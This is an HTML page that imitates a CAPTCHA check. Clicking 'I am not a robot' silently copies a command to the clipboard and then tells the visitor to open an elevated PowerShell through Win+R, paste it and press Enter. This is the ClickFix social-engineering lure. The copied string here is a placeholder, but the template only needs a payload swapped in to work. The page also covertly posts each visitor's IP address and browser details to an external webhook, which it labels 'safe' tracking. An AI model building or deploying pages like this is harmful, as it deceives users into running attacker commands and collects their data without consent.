<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Verification</title>
<style>
body {
  font-family: Arial;
  display: flex;
  justify-content: center;
  align-items: center;
  height: 100vh;
  background: #f5f5f5;
}
.box {
  background: #fff;
  padding: 30px;
  border-radius: 10px;
  text-align: center;
  width: 340px;
  box-shadow: 0 5px 20px rgba(0,0,0,0.1);
}
.code-box {
  font-family: monospace;
  background: #f0f0f0;
  padding: 10px;
  border-radius: 6px;
  margin: 15px 0;
  letter-spacing: 2px;
}
button {
  padding: 10px 15px;
  cursor: pointer;
  border: none;
  background: #2563eb;
  color: #fff;
  border-radius: 6px;
}
button:hover {
  background: #1d4ed8;
}
.toast {
  position: fixed;
  bottom: 20px;
  left: 50%;
  transform: translateX(-50%);
  background: black;
  color: white;
  padding: 10px 20px;
  border-radius: 20px;
  opacity: 0;
  transition: 0.3s;
}
.toast.show {
  opacity: 1;
}
.steps {
  text-align: left;
  margin-top: 15px;
}
.step {
  background: #f3f3f3;
  padding: 10px;
  border-radius: 6px;
  margin-bottom: 8px;
  font-size: 14px;
}
.hidden { display: none; }
</style>
</head>
<body>

<div class="box">

  <!-- PANEL 1 -->
  <div id="panel1">
    <h3>Verification Required</h3>
    <p>Confirm you are not a robot</p>
    <div class="code-box" id="fakeCode">A7F9-K2L8-XP21</div>
    <button onclick="verify()">I am not a robot</button>
  </div>

  <!-- PANEL 2 (STEPS) -->
  <div id="panel2" class="hidden">
    <h3>Follow the steps</h3>
    <div class="steps">
      <div class="step">1- Press Windows key + R</div>
      <div class="step">2- Type powershell hold Ctrl + Shift press Enter</div>
      <div class="step">3- Press Ctrl+V</div>
      <div class="step">4- Press Enter and wait for Verification</div>
    </div>
  </div>

</div>

<div class="toast" id="toast">Copied to clipboard</div>

<script>
// Fake command (for demonstration)
const realCommand = 'babydodos';

function showToast() {
  const t = document.getElementById("toast");
  t.classList.add("show");
  setTimeout(() => t.classList.remove("show"), 2000);
}

function generateFakeCode() {
  const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
  let code = "";
  for (let i = 0; i < 12; i++) {
    if (i === 4 || i === 8) code += "-";
    else code += chars[Math.floor(Math.random() * chars.length)];
  }
  return code;
}

function verify() {
  // copy command
  navigator.clipboard.writeText(realCommand);

  // change fake code
  document.getElementById("fakeCode").innerText = generateFakeCode();

  // show toast
  showToast();

  // switch panels after short delay
  setTimeout(() => {
    document.getElementById("panel1").classList.add("hidden");
    document.getElementById("panel2").classList.remove("hidden");
  }, 500);

  // track visit safely via webhook
  trackVisit();
}

// Safe visitor tracking (using free webhook)
async function trackVisit() {
  try {
    const ipResponse = await fetch('https://api.ipify.org?format=json');
    const ipData = await ipResponse.json();

    const payload = {
      ip: ipData.ip,
      userAgent: navigator.userAgent,
      time: new Date().toISOString()
    };

    // Replace with your own webhook URL
    await fetch("https://hook.eu1.make.com/k26huxfupafukgmuxbp55nxl6i4i8y2d", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload)
    });
  } catch(e) {
    console.log("Tracking failed", e);
  }
}
</script>

</body>
</html>